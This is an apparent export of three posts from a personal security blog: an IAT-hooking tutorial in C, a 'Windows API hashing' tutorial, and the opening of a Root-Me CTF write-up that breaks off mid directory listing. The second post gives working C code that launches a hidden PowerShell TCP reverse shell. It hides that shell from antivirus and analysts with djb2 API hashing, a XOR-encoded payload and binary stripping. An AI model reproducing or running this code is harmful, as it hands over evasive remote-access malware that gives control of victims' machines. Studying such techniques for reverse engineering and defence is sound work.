[{"content":"Import Table When you run a Portable Executable (PE), before the execution of our program, libraries will be loaded in memory and their function addresses will be referenced in the Import Address Table (IAT). When a program calls a function from a DLL, it calls the address located in the IAT wich point to the function in memory.\ndiagram of a normal api call :\ndiagram of an hooked api call :\nWe want to change the address of this API call in the IAT to execute an non intended function. This technique can be useful for reverse engineer to change the result of a function or dump his parameter (for example if you have a runPE you can hook the WriteProcessMemory function and easily dump the PE.) and it can be useful for malware devellopers to hide some malicious code.\nImport table structure You can learn more about the import table here.\nThe import table is a null terminated array a null terminated array of IMAGE_IMPORT_DESCRIPTOR structure.\ntypedef struct _IMAGE_IMPORT_DESCRIPTOR { union { DWORD Characteristics; DWORD OriginalFirstThunk; } DUMMYUNIONNAME; DWORD TimeDateStamp; DWORD ForwarderChain; DWORD Name; DWORD FirstThunk; } IMAGE_IMPORT_DESCRIPTOR; typedef IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR; Each dll in the Import Table as an IMAGE_IMPORT_DESCRIPTOR structure which contains information about it like its name, its functions, etc.\nHere we will focus only on interesting things for us.\nDWORD Name : RVA of an ASCII string that contains the name of the module (dll name)\nDWORD OriginalFirstThunk : RVA of the Import Lookup Table (ILT)\nDWORD FirstThunk : RVA of the Import Address Table (IAT)\nRelative Virtual Address (RVA) means Relative to the base address.\nExample : dll_name = PE_Base_Address + IMAGE_IMPORT_DESCRIPTOR.Name\nOriginalFirstThunk and FirstThunk The IAT and ILT are parallel\u0026rsquo;s NULL terminated arrays.\nTheir structure is defined as it :\ntypedef struct _IMAGE_THUNK_DATA { union { uint32_t* Function; // address of imported function uint32_t Ordinal; // ordinal value of function PIMAGE_IMPORT_BY_NAME AddressOfData; // RVA of imported name DWORD ForwarderStringl // RVA to forwarder string } u1; } IMAGE_THUNK_DATA, *PIMAGE_THUNK_DATA; Import Lookup Table The ILT contain names and ordinals for each API call.\nif the first bit of AddressOfData is 1, this DWORD is the ordinal of the function to import.\nElse, the AddressOfData point to a IMAGE_IMPORT_BY_NAME structure which contains the API call name and looks like this :\ntypedef struct _IMAGE_IMPORT_BY_NAME { WORD Hint; BYTE Name[1]; /*The BYTE designated at Name of course only marks the beginning of the character array of the imported function name as the name can be larger than one character.*/ } IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME; Import Address Table The IAT contain virtual address of these API calls.\nParsing the import table Now, we have to parse our PE to find it\u0026rsquo;s Import Table. To do that we will use the winnt.h library in C.\nThe following diagram illustrate the simplified structure of a PE.\nWe first have to retrieve the base address of our PE. To do it we can call the GetModuleHandle() API call.\nGetModuleHandle(NULL)\nNow, like my previous article about API Windows Hashing, we will parse the PE.\nHANDLE PE_base = GetModuleHandle(NULL); IMAGE_DOS_HEADER* p_DOS_HDR = (IMAGE_DOS_HEADER*) PE_base; // convert your data into an IMAGE_DOS_HEADER* type defined in winnt.h IMAGE_NT_HEADERS* p_NT_HDR = (IMAGE_NT_HEADERS*) ((LPBYTE)PE_base + p_DOS_HDR-\u0026gt;e_lfanew ); // NT HEADERS are located at the raw offset defined in the e_lfanew header // RVA of the import table can be found in the optional headers // https://learn.microsoft.com/en-us/windows/win32/debug/pe-format#optional-header-data-directories-image-only // https://0xrick.github.io/win-internals/pe6/#import-directory-table IMAGE_IMPORT_DESCRIPTOR* import_table = (IMAGE_IMPORT_DESCRIPTOR*)((LPBYTE)PE_base + p_NT_HDR-\u0026gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress); Here we retrieve the address of the first IMAGE_IMPORT_DESCRIPTOR array.\nwe can easily iterate trought the null terminated array using a while loop :\nwhile (import_table-\u0026gt;Name != 0) { // print each dll loaded in the import table printf(\u0026#34;%s\\n\u0026#34;, (char*)((LPBYTE)PE_base + import_table-\u0026gt;Name)); } Now, we want for each DLLs to retrieve their functions name and address. We first have to find our ILT and IAT and iterate throught it.\nIMAGE_THUNK_DATA* lookup_table = (IMAGE_THUNK_DATA*)((LPBYTE)PE_base + import_table-\u0026gt;OriginalFirstThunk); IMAGE_THUNK_DATA* address_table = (IMAGE_THUNK_DATA*)((LPBYTE)PE_base + import_table-\u0026gt;FirstThunk); // it will print all function name of the module. while(lookup_table-\u0026gt;u1.AddressOfData != 0) { // check if its an import by ordinal if((lookup_table-\u0026gt;u1.AddressOfData \u0026amp; IMAGE_ORDINAL_FLAG) == 0) { // retrieve the struct wich contains the function name IMAGE_IMPORT_BY_NAME* lookup_addr = (IMAGE_IMPORT_BY_NAME*)((LPBYTE)PE_base + lookup_table-\u0026gt;u1.AddressOfData); printf(\u0026#34;%s\\n\u0026#34;, (char*)lookup_addr-\u0026gt;Name); } lookup_table++; address_table++; } Now we can print a function\u0026rsquo;s address from its name, like MessageBoxA as below:\n// we want to print the address of the MessageBoxA API call. if(strcmp(lookup_addr-\u0026gt;Name, \u0026#34;MessageBoxA\u0026#34;) == 0) { printf(\u0026#34;%p\\n\u0026#34;, address_table-\u0026gt;u1.Function); // print the function address } Okay, now we have the address of the API call we want to hook.\nThe complete function to print it looks like this :\nvoid print_address_by_parsing_IAT(HMODULE PE_base, char* function_to_hook) { IMAGE_DOS_HEADER* p_DOS_HDR = (IMAGE_DOS_HEADER*) PE_base; IMAGE_NT_HEADERS* p_NT_HDR = (IMAGE_NT_HEADERS*) ((LPBYTE)PE_base + p_DOS_HDR-\u0026gt;e_lfanew ); IMAGE_IMPORT_DESCRIPTOR* import_table = (IMAGE_IMPORT_DESCRIPTOR*)((LPBYTE)PE_base + p_NT_HDR-\u0026gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress); // iterate throught the null terminated modules array while (import_table-\u0026gt;Name != 0) { // retrieve ILT and IAT IMAGE_THUNK_DATA* lookup_table = (IMAGE_THUNK_DATA*)((LPBYTE)PE_base + import_table-\u0026gt;OriginalFirstThunk); IMAGE_THUNK_DATA* address_table = (IMAGE_THUNK_DATA*)((LPBYTE)PE_base + import_table-\u0026gt;FirstThunk); // iterate throught IAT and ILT while(lookup_table-\u0026gt;u1.AddressOfData != 0) { // check if the function is called by ordinal if((lookup_table-\u0026gt;u1.AddressOfData \u0026amp; IMAGE_ORDINAL_FLAG) == 0) { // if it is not retrieve its IMAGE_IMPORT_BY_NAME structure IMAGE_IMPORT_BY_NAME* lookup_addr = (IMAGE_IMPORT_BY_NAME*)((LPBYTE)PE_base + lookup_table-\u0026gt;u1.AddressOfData); // compare the function name with the function name to hook if(strcmp(lookup_addr-\u0026gt;Name, function_to_hook) == 0) { printf(\u0026#34;%p\\n\u0026#34;, address_table-\u0026gt;u1.Function); } } // next element of the IAT and the ILT lookup_table++; address_table++; } // next module import_table++; } } So, this function will just print the API call address. Now we have to change it.\nHooking the API call Lets make a fake MessageBox :\nINT WINAPI fake_messagebox(HWND hWnd, LPCTSTR lpText, LPCTSTR lpCaption, UINT uType){ printf(\u0026#34;I hooked your function :)\\n\u0026#34;); printf(\u0026#34;you wanted to display %s\\n\u0026#34;, lpText); return 0; } Instead of printing the MessageBoxA address in the IAT, we will overwrite it by fake_messagebox address and save the real MessageBox address into an other variable.\naddress_table-\u0026gt;u1.Function = (ULONGLONG)fake_messagebox;\nOur final code look like this.\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;windows.h\u0026gt; typedef int(WINAPI* MESSAGE_BOX_TYPE)(HWND hWnd, LPCTSTR lpText, LPCTSTR lpCaption, UINT uType); MESSAGE_BOX_TYPE MessageBoxSaved; INT WINAPI fake_messagebox(HWND hWnd, LPCTSTR lpText, LPCTSTR lpCaption, UINT uType){ printf(\u0026#34;I hooked your function :)\\n\u0026#34;); printf(\u0026#34;you wanted to display %s\\n\u0026#34;, lpText); return MessageBoxSaved(hWnd, lpText, lpCaption, uType); } void hook_IAT(HMODULE PE_base, char* function_to_hook) { IMAGE_DOS_HEADER* p_DOS_HDR = (IMAGE_DOS_HEADER*) PE_base; IMAGE_NT_HEADERS* p_NT_HDR = (IMAGE_NT_HEADERS*) ((LPBYTE)PE_base + p_DOS_HDR-\u0026gt;e_lfanew ); IMAGE_IMPORT_DESCRIPTOR* import_table = (IMAGE_IMPORT_DESCRIPTOR*)((LPBYTE)PE_base + p_NT_HDR-\u0026gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress); // iterate throught the null terminated modules array while (import_table-\u0026gt;Name != 0) { // retrieve ILT and IAT IMAGE_THUNK_DATA* lookup_table = (IMAGE_THUNK_DATA*)((LPBYTE)PE_base + import_table-\u0026gt;OriginalFirstThunk); IMAGE_THUNK_DATA* address_table = (IMAGE_THUNK_DATA*)((LPBYTE)PE_base + import_table-\u0026gt;FirstThunk); // iterate throught IAT and ILT while(lookup_table-\u0026gt;u1.AddressOfData != 0) { // check if the function is called by ordinal if((lookup_table-\u0026gt;u1.AddressOfData \u0026amp; IMAGE_ORDINAL_FLAG) == 0) { // if it is not retrieve its IMAGE_IMPORT_BY_NAME structure IMAGE_IMPORT_BY_NAME* lookup_addr = (IMAGE_IMPORT_BY_NAME*)((LPBYTE)PE_base + lookup_table-\u0026gt;u1.AddressOfData); // compare the function name with the function name to hook if(strcmp(lookup_addr-\u0026gt;Name, function_to_hook) == 0) { // change its address address_table-\u0026gt;u1.Function = (ULONGLONG)fake_messagebox; } } // next element of the IAT and the ILT lookup_table++; address_table++; } // next module import_table++; } } int main(void) { // save MessageBox function MessageBoxSaved = (MESSAGE_BOX_TYPE)GetProcAddress(LoadLibrary(\u0026#34;user32.dll\u0026#34;), \u0026#34;MessageBoxA\u0026#34;); // hook the function hook_IAT(GetModuleHandle(NULL), \u0026#34;MessageBoxA\u0026#34;); MessageBoxA(NULL, \u0026#34;hello world\u0026#34;, \u0026#34;simple message box\u0026#34;, MB_OK); } /* output : I hooked your function :) you wanted to display hello world */ To go further you can hook any function present in the IAT of an other process using DLL injection to execute some code which will patch the import table. It\u0026rsquo;s a bit more difficult but it can be interesting for game hacking or reverse engineering.\nIssue This technic is useful, but it can be bypassed if the program retrieve its API call address from the Export Table using the GetProcAddress() function.\nConclusion This example was basic, but I think with it you can make lot of funny things.\nI hope you enjoyed to read it, have a nice day.\n","permalink":"https://trikkss.github.io/posts/IAT_hooking/","summary":"IAT hooking is a technique often used by malware developers, game hackers or reverse engineer to replace a function from the Import Table by another one.","title":"Malware - IAT Hooking"},{"content":"What is Windows API Hashing This technique is often used by malware developers to hide their calls to the windows API. That way the blue team will have more difficulty reversing the malware and it is less flagged by an AV. Our goal is to make a PE without an import table.\nThe Import Table Let\u0026rsquo;s compile a simple C program which will execute a simple reverse shell using WinExec API call. That call creates a new process and executes a system command.\n#include \u0026lt;windows.h\u0026gt; int main(void) { // execute our reverse shell WinExec(\u0026#34;powershell -nop -c \\\u0026#34;$client = New-Object System.Net.Sockets.TCPClient(\u0026#39;127.0.0.1\u0026#39;,4444);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2\u0026gt;\u0026amp;1 | Out-String );$sb2 = $sb + \u0026#39;PS \u0026#39; + (pwd).Path + \u0026#39;\u0026gt; \u0026#39;;$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()\\\u0026#34;\u0026#34;, SW_HIDE); return 0; } Before the execution of our program, libraries will be loaded in memory and their function addresses will be referenced in the Import Address Table (IAT). When a program calls a function from a DLL, it calls the address located in the IAT wich points to the function in memory.\nIf we look into our import table (I used CFF Explorer to do it) we can see several imported DLLs and our suspicious function (WinExec).\nA first way will to hide our function would be to retrieve its address at runtime using the GetProcAddress() API call.\n#include \u0026lt;windows.h\u0026gt; typedef UINT(WINAPI* winexec)(LPCSTR lpCmdLine, UINT uCmdShow); int main(void) { // get handle of kernel32.dll HMODULE kernel32_dll = GetModuleHandle(\u0026#34;kernel32.dll\u0026#34;); // parse it to find the WinExec function winexec WinExec_imported = (winexec)GetProcAddress(kernel32_dll, \u0026#34;WinExec\u0026#34;); // execute our reverse shell WinExec_imported(\u0026#34;powershell -nop -c \\\u0026#34;$client = New-Object System.Net.Sockets.TCPClient(\u0026#39;127.0.0.1\u0026#39;,4444);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2\u0026gt;\u0026amp;1 | Out-String );$sb2 = $sb + \u0026#39;PS \u0026#39; + (pwd).Path + \u0026#39;\u0026gt; \u0026#39;;$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()\\\u0026#34;\u0026#34;, SW_HIDE); return 0; } Here we retrieve the handle (the base address) of the kernel32.dll module with the GetModuleHandle() API call. Now we can use the GetProcAddress() API call to parse our DLL and return the function\u0026rsquo;s address.\nIt works, WinExec seems to be absent from our IAT. But until now it\u0026rsquo;s easy to reverse and functions like GetModuleHandle and GetProcAddress can be suspicious \u0026hellip;\nWrite our own GetProcAddress We will write our own GetProcAddress() function and instead of searching for a function name, we will search for a hash. For now this may be strange for you but don\u0026rsquo;t worry you will understand everything. First we need to understand how the export table works.\nThe Export Table An Export Adress Table (EAT) will reference all the exported functions from a dll.\nThis is what the _IMAGE_EXPORT_DIRECTORY (wich represents the export table) structure defined into the winnt.h library looks like.\ntypedef struct _IMAGE_EXPORT_DIRECTORY { DWORD Characteristics; DWORD TimeDateStamp; WORD MajorVersion; WORD MinorVersion; DWORD Name; DWORD Base; DWORD NumberOfFunctions; DWORD NumberOfNames; DWORD AddressOfFunctions; DWORD AddressOfNames; DWORD AddressOfNameOrdinals; } IMAGE_EXPORT_DIRECTORY,*PIMAGE_EXPORT_DIRECTORY; Name : the module name (dll name if you want) NumberOfFunctions : number of functions available in the module NumberOfNames : because some functions do not have names AddressOfFunctions : pointer to an array of address AddressOfNames : pointer to an array list of names AddressOfNameOrdinals : pointer to an array of \u0026ldquo;ordinals\u0026rdquo; (i will explain that.) diagram from Infosec Resources\nEach function has a number associated to it. It is called an ordinal. Each function name is associated to an ordinal but a function may have no name. Functions are often imported by their names but it makes a lot of strcmp so sometimes functions are imported by ordinal. It makes reverse engineering a bit harder and functions import faster.\nSo now, we can make a \u0026ldquo;roadmap\u0026rdquo; in order to create our own GetProcAdress():\nfirst, we must parse our dll to find the export table after we have to browse the name list to find our function name get ordinal associated to this name get address function associated to this ordinal and return it Parse the dll\u0026rsquo;s to do that we will use the winnt.h library in C.\nThe following diagram illustrates the simplified structure of a PE. more about PE format : Malware researcher’s handbook (demystifying PE file) | Infosec Resources\nSo, we have to parse the DOS header first, then the NT header to access the optionnal headers and finally get the Export Address Table (located in the .edata section)\n#include \u0026lt;windows.h\u0026gt; #include \u0026lt;winnt.h\u0026gt; void* my_GetProcAddress(HMODULE dll_handle, char* hashed_function_name) { // a dll is a Portable Executable file. IMAGE_DOS_HEADER* p_DOS_HDR = (IMAGE_DOS_HEADER*) dll_handle; // convert your data into an IMAGE_DOS_HEADER* type defined in winnt.h IMAGE_NT_HEADERS* p_NT_HDR = (IMAGE_NT_HEADERS*) ((LPBYTE)dll_handle + p_DOS_HDR-\u0026gt;e_lfanew ); // NT HEADERS are located at the raw offset defined in the e_lfanew header // RVA of the export table can be found in the optional headers // https://learn.microsoft.com/en-us/windows/win32/debug/pe-format#optional-header-data-directories-image-only IMAGE_EXPORT_DIRECTORY* export_table = (IMAGE_EXPORT_DIRECTORY*)((LPBYTE)dll_handle + p_NT_HDR-\u0026gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress); return NULL; } Now we have the address of our export table. Let\u0026rsquo;s parse it following the EAT diagram above.\nPARSE OUR EXPORT TABLE Getting the name, ordinal and address array.\nDWORD numberOfNames = export_table-\u0026gt;NumberOfNames; // size of array name DWORD* functions_address = (DWORD*)((LPBYTE)dll_handle + export_table-\u0026gt;AddressOfFunctions); // array function DWORD* functions_names = (DWORD*)((LPBYTE)dll_handle + export_table-\u0026gt;AddressOfNames); // array name WORD* functions_ordinal = (WORD*)((LPBYTE)dll_handle + export_table-\u0026gt;AddressOfNameOrdinals); // array ordinal let\u0026rsquo;s iterate through the array name to find our function\nfor(size_t i=0; i \u0026lt; numberOfNames; i++) { char *name = (char*)dll_handle + functions_names[i]; if (strcmp(hashed_function_name, name) == 0) { printf(\u0026#34;function %s found into %s !\\n\u0026#34;, name, (char*)dll_handle+export_table-\u0026gt;Name); } } This loop iterates through the name array and compares each function\u0026rsquo;s name to our string. Now we just have to return the function\u0026rsquo;s address, this is the tricky part. We have to find the ordinal attached to this function\u0026rsquo;s name.\n// these 2 arrays are parallel functions_names[i] // -\u0026gt; name (string) functions_ordinal[i] // -\u0026gt; ordinal (integer) // index of the function into the functions_address list // so we just have to do this to get the function functions_address[functions_ordinal[i]] don\u0026rsquo;t forget that these addresses are relative to the base address so we have to add base_address + address\nHere it\u0026rsquo;s the complete code of our function :\nvoid* my_GetProcAddress(HMODULE dll_handle, char* hashed_function_name) { IMAGE_DOS_HEADER* p_DOS_HDR = (IMAGE_DOS_HEADER*) dll_handle; // convert your data into an IMAGE_DOS_HEADER* type defined in winnt.h IMAGE_NT_HEADERS* p_NT_HDR = (IMAGE_NT_HEADERS*) ((LPBYTE)dll_handle + p_DOS_HDR-\u0026gt;e_lfanew ); // NT HEADERS are located at the raw offset defined in the e_lfanew header IMAGE_EXPORT_DIRECTORY* export_table = (IMAGE_EXPORT_DIRECTORY*)((LPBYTE)dll_handle + p_NT_HDR-\u0026gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress); // .edata section DWORD numberOfNames = export_table-\u0026gt;NumberOfNames; printf(\u0026#34;number of names : %d\\n\u0026#34;, numberOfNames); DWORD* functions_address = (DWORD*)((LPBYTE)dll_handle + export_table-\u0026gt;AddressOfFunctions); DWORD* functions_names = (DWORD*)((LPBYTE)dll_handle + export_table-\u0026gt;AddressOfNames); WORD* functions_ordinal = (WORD*)((LPBYTE)dll_handle + export_table-\u0026gt;AddressOfNameOrdinals); for(size_t i=0; i \u0026lt; numberOfNames; i++) { char *name = (char*)dll_handle + functions_names[i]; // printf(\u0026#34;%s\\n\u0026#34;,name); if (strcmp(hashed_function_name, name) == 0) { printf(\u0026#34;function %s found into %s !\\n\u0026#34;, name, (char*)dll_handle+export_table-\u0026gt;Name); return (LPBYTE)dll_handle + functions_address[functions_ordinal[i]]; } } return NULL; } Nice it works. Now we just have to \u0026ldquo;obfuscate\u0026rdquo; the name of our DLLs.\nAfter searching a bit on google I found the djb2 algorithm wich seems fast and interesting.\nunsigned long hash_djb2(unsigned char *str) { unsigned long hash = 5381; int c; while (c = *str++) hash = ((hash \u0026lt;\u0026lt; 5) + hash) + c; /* hash * 33 + c */ return hash; } If we call our hash fonction with \u0026ldquo;WinExec\u0026rdquo; argument we have this output :\nprintf(\u0026#34;%lu\\n\u0026#34;, hash_djb2(\u0026#34;WinExec\u0026#34;)); // output : 698766968 So our final function is :\nvoid* my_GetProcAddress(HMODULE dll_handle, unsigned long hashed_function_name) { IMAGE_DOS_HEADER* p_DOS_HDR = (IMAGE_DOS_HEADER*) dll_handle; // convert your data into an IMAGE_DOS_HEADER* type defined in winnt.h IMAGE_NT_HEADERS* p_NT_HDR = (IMAGE_NT_HEADERS*) ((LPBYTE)dll_handle + p_DOS_HDR-\u0026gt;e_lfanew ); // NT HEADERS are located at the raw offset defined in the e_lfanew header IMAGE_EXPORT_DIRECTORY* export_table = (IMAGE_EXPORT_DIRECTORY*)((LPBYTE)dll_handle + p_NT_HDR-\u0026gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress); // .edata section DWORD numberOfNames = export_table-\u0026gt;NumberOfNames; DWORD* functions_address = (DWORD*)((LPBYTE)dll_handle + export_table-\u0026gt;AddressOfFunctions); DWORD* functions_names = (DWORD*)((LPBYTE)dll_handle + export_table-\u0026gt;AddressOfNames); WORD* functions_ordinal = (WORD*)((LPBYTE)dll_handle + export_table-\u0026gt;AddressOfNameOrdinals); for(size_t i=0; i \u0026lt; numberOfNames; i++) { char *name = (char*)dll_handle + functions_names[i]; // printf(\u0026#34;%s\\n\u0026#34;,name); if (hashed_function_name == hash_djb2(name)) { return (LPBYTE)dll_handle + functions_address[functions_ordinal[i]]; } } return NULL; } and our final reverse shell looks like this :\n#include \u0026lt;windows.h\u0026gt; #include \u0026lt;winnt.h\u0026gt; typedef UINT(WINAPI* winexec)(LPCSTR lpCmdLine, UINT uCmdShow); void* my_GetProcAddress(HMODULE dll_handle, unsigned long hashed_function_name); unsigned long hash_djb2(unsigned char *str); void xor(char* string, unsigned long key); int main(void) { // get handle of kernel32.dll unsigned long hash_function_name = 698766968; // char payload[] = \u0026#34;powershell -nop -c \\\u0026#34;$client = New-Object System.Net.Sockets.TCPClient(\u0026#39;127.0.0.1\u0026#39;,4444);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2\u0026gt;\u0026amp;1 | Out-String );$sb2 = $sb + \u0026#39;PS \u0026#39; + (pwd).Path + \u0026#39;\u0026gt; \u0026#39;;$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()\\\u0026#34;\u0026#34;; char payload[] = \u0026#34;\\x09\\x18\\x10\\x1e\\x0b\\x0c\\x11\\x1e\\x15\\x15\\x59\\x56\\x17\\x18\\x09\\x59\\x56\\x1c\\x59\\x5b\\x5d\\x1c\\x15\\x12\\x1e\\x17\\x0d\\x59\\x46\\x59\\x37\\x1e\\x10\\x56\\x38\\x1b\\x13\\x1e\\x1c\\x0d\\x59\\x2c\\x02\\x0c\\x0d\\x1e\\x16\\x57\\x37\\x1e\\x0d\\x57\\x2c\\x18\\x1c\\x14\\x1e\\x0d\\x0c\\x57\\x2d\\x3c\\x29\\x3c\\x15\\x12\\x1e\\x17\\x0d\\x51\\x60\\x4a\\x4b\\x50\\x57\\x49\\x57\\x49\\x57\\x4a\\x60\\x55\\x4d\\x4d\\x4d\\x4d\\x52\\x44\\x5d\\x0c\\x59\\x46\\x59\\x5d\\x1c\\x15\\x12\\x1e\\x17\\x0d\\x57\\x40\\x1e\\x0d\\x2c\\x0d\\x0b\\x1e\\x1a\\x16\\x51\\x52\\x44\\x24\\x1b\\x02\\x0d\\x1e\\x24\\x26\\x26\\x5d\\x1b\\x59\\x46\\x59\\x49\\x57\\x57\\x4f\\x4e\\x4e\\x4c\\x4e\\x05\\x5e\\x04\\x49\\x06\\x44\\x10\\x11\\x12\\x15\\x1e\\x51\\x51\\x5d\\x12\\x59\\x46\\x59\\x5d\\x0c\\x57\\x2b\\x1e\\x1a\\x1d\\x51\\x5d\\x1b\\x55\\x59\\x49\\x55\\x59\\x5d\\x1b\\x57\\x35\\x1e\\x17\\x20\\x0d\\x11\\x52\\x52\\x59\\x56\\x17\\x1e\\x59\\x49\\x52\\x04\\x44\\x5d\\x1d\\x1a\\x0d\\x1a\\x59\\x46\\x59\\x51\\x37\\x1e\\x10\\x56\\x38\\x1b\\x13\\x1e\\x1c\\x0d\\x59\\x56\\x2d\\x02\\x09\\x1e\\x37\\x1a\\x16\\x1e\\x59\\x2c\\x02\\x0c\\x0d\\x1e\\x16\\x57\\x2d\\x1e\\x01\\x0d\\x57\\x3a\\x2c\\x3c\\x32\\x32\\x3e\\x17\\x1c\\x18\\x1d\\x12\\x17\\x20\\x52\\x57\\x40\\x1e\\x0d\\x2c\\x0d\\x0b\\x12\\x17\\x20\\x51\\x5d\\x1b\\x55\\x49\\x55\\x59\\x5d\\x12\\x52\\x44\\x5d\\x0c\\x1b\\x59\\x46\\x59\\x51\\x12\\x1e\\x01\\x59\\x5d\\x1d\\x1a\\x0d\\x1a\\x59\\x4b\\x47\\x5f\\x4a\\x59\\x05\\x59\\x38\\x0e\\x0d\\x56\\x2c\\x0d\\x0b\\x12\\x17\\x20\\x59\\x52\\x44\\x5d\\x0c\\x1b\\x4b\\x59\\x46\\x59\\x5d\\x0c\\x1b\\x59\\x54\\x59\\x60\\x29\\x2c\\x59\\x60\\x59\\x54\\x59\\x51\\x09\\x10\\x1d\\x52\\x57\\x29\\x1a\\x0d\\x11\\x59\\x54\\x59\\x60\\x47\\x59\\x60\\x44\\x5d\\x0c\\x1b\\x0d\\x59\\x46\\x59\\x51\\x24\\x0d\\x1e\\x01\\x0d\\x57\\x1e\\x17\\x1c\\x18\\x1d\\x12\\x17\\x20\\x26\\x43\\x43\\x3a\\x2c\\x3c\\x32\\x32\\x52\\x57\\x40\\x1e\\x0d\\x3b\\x02\\x0d\\x1e\\x0c\\x51\\x5d\\x0c\\x1b\\x4b\\x52\\x44\\x5d\\x0c\\x57\\x30\\x0b\\x12\\x0d\\x1e\\x51\\x5d\\x0c\\x1b\\x0d\\x55\\x49\\x55\\x5d\\x0c\\x1b\\x0d\\x57\\x35\\x1e\\x17\\x20\\x0d\\x11\\x52\\x44\\x5d\\x0c\\x57\\x3f\\x15\\x0e\\x0c\\x11\\x51\\x52\\x06\\x44\\x5d\\x1c\\x15\\x12\\x1e\\x17\\x0d\\x57\\x3c\\x15\\x18\\x0c\\x1e\\x51\\x52\\x5b\u0026#34;; xor(payload, hash_function_name); HMODULE kernel32_dll = LoadLibrary(\u0026#34;kernel32.dll\u0026#34;); // parse it to find the WinExec function //winexec WinExec_imported = (winexec)GetProcAddress(kernel32_dll, \u0026#34;WinExec\u0026#34;); winexec WinExec_imported = (winexec)my_GetProcAddress(kernel32_dll, 698766968); WinExec_imported(payload, SW_HIDE); return 0; } void xor(char* string, unsigned long key) { while (*string) { *string -= 1; *string++ ^= (char)(key \u0026amp; 0xff); } } void* my_GetProcAddress(HMODULE dll_handle, unsigned long hashed_function_name) { IMAGE_DOS_HEADER* p_DOS_HDR = (IMAGE_DOS_HEADER*) dll_handle; // convert your data into an IMAGE_DOS_HEADER* type defined in winnt.h IMAGE_NT_HEADERS* p_NT_HDR = (IMAGE_NT_HEADERS*) ((LPBYTE)dll_handle + p_DOS_HDR-\u0026gt;e_lfanew ); // NT HEADERS are located at the raw offset defined in the e_lfanew header IMAGE_EXPORT_DIRECTORY* export_table = (IMAGE_EXPORT_DIRECTORY*)((LPBYTE)dll_handle + p_NT_HDR-\u0026gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress); // .edata section DWORD numberOfNames = export_table-\u0026gt;NumberOfNames; DWORD* functions_address = (DWORD*)((LPBYTE)dll_handle + export_table-\u0026gt;AddressOfFunctions); DWORD* functions_names = (DWORD*)((LPBYTE)dll_handle + export_table-\u0026gt;AddressOfNames); WORD* functions_ordinal = (WORD*)((LPBYTE)dll_handle + export_table-\u0026gt;AddressOfNameOrdinals); for(size_t i=0; i \u0026lt; numberOfNames; i++) { char *name = (char*)dll_handle + functions_names[i]; // printf(\u0026#34;%s\\n\u0026#34;,name); if (hashed_function_name == hash_djb2(name)) { return (LPBYTE)dll_handle + functions_address[functions_ordinal[i]]; } } return NULL; } unsigned long hash_djb2(unsigned char *str) { unsigned long hash = 5381; int c; while (c = *str++) hash = ((hash \u0026lt;\u0026lt; 5) + hash) + c; /* hash * 33 + c */ return hash; } i changed my mind, instead of using GetModuleHandle() which just returns the base address only if a module is loaded in memory I used LoadLibrary() wich will load the library if it is not loaded and also return its handle.\nwe compile it :\ngcc reverse-shell.c -s -o reverse-shell.exe I just obfuscated a bit the powershell payload with a simple xor and compile it with the -s flag to strip our PE. Stripping a PE means to discard these debugging symbols (like the function name). Stripping a binary reduces its size on the disk and makes it a little more difficult to debug and reverse engineer.\nour main function now :\nand our own GetProcAddress is a bit hard to recognize (of course an experimented reverse engineer will recognize it easily):\nThe WinExec and GetProcAddress functions are now totally absent in the IAT.\nConclusion That\u0026rsquo;s all for this post, I hope you enjoyed it. If I said some things wrong or if I made any mistake feel free to report them to me. Same, if you don\u0026rsquo;t understand something contact me on Discord or Twitter. I will be happy to help you. Next time we will see how to make our own GetModuleHandle by parsing the Process Block Environment and make a PE without an import table.\n","permalink":"https://trikkss.github.io/posts/hiding_windows_api_calls_part1/","summary":"Windows API Hashing is a technique often used by malware developers to hide their calls to the windows API.","title":"Malware - Windows API hashing 1"},{"content":"PROTONIC VAULT Hello, today i will explain how i solved the Protonic Vault challenge from the Root-Me capture the flag.\nChallenge content user@debian:~/protonic_vault$ tree protonic-vault\rprotonic-vault\r├── chrome_100_percent.pak\r├── chrome_200_percent.pak\r├── d3dcompiler_47.dll\r├── ffmpeg.dll\r├── icudtl.dat\r├── libEGL.dll\r├── libGLESv2.dll\r├── LICENSE\r├── LICENSES.chromium.html\r├── locales\r│ ├── af.pak\r│ ├── am.pak\r│ ├── ar.pak\r│ ├── bg.pak\r│ ├── bn.pak\r│ ├── ca.pak\r│ ├── cs.pak\r│ ├── da.pak\r[...]\r│ ├── te.pak\r│ ├── th.pak\r│ ├── tr.pak\r│ ├── uk.pak\r│ ├── ur.pak\r│ ├── vi.pak\r│ ├── zh-CN.pak\r│ └── zh-TW.pak\r├── protonic-vault.exe\r├── resources\r│ └── app.asar\r├── resources.pak\r├── snapshot_blob.bin\r├── v8_context_snapshot.bin\r├── version\r├── vk_swiftshader.dll\r├── vk_swiftshader_icd.json\r└── 